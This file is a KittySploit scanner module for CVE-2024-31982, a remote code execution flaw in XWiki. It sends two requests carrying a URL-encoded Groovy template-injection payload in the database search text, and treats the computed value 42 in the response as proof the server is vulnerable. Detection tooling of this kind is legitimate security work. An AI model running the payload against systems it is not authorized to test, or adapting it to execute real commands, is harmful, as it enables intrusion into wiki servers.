#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform is a generic wiki platform."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki < 4.10.20 - Remote code execution Detection',
        'description': "XWiki Platform is a generic wiki platform. Starting in version 2.4-milestone-1 and prior to versions 4.10.20, 15.5.4, and 15.10-rc-1, XWiki's database search allows remote code execution through the search text. This allows remote code execution for any visitor of a public wiki or user of a closed wiki as the database search is by default accessible for all users. This impacts the confidentiality, integrity and availability of the whole XWiki installation. This vulnerability has been patched in XWiki 14.10.20, 15.5.4 and 15.10RC1. As a workaround, one may manually apply the patch to the page `Main.DatabaseSearch`. Alternatively, unless database search is explicitly used by users, this page can be deleted as this is not the default search interface of XWiki.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'xwiki', 'rce', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://jira.xwiki.org/browse/XWIKI-21472',
            'https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2858-8cfx-69m9',
            'https://jira.xwiki.org/browse/XWIKI-21110',
        ],
        'cve': 'CVE-2024-31982',
    }

    def run(self):
        for path in ('/xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20', '/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22Hello%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%2823%20%2B%2019%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('Hello from search text:42</title>', '<title>RSS feed',)
            header_any = ('text/javascript',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='critical',
                    reason="XWiki < 4.10.20 - Remote code execution detected",
                    path=path,
                )
                return True
        return False

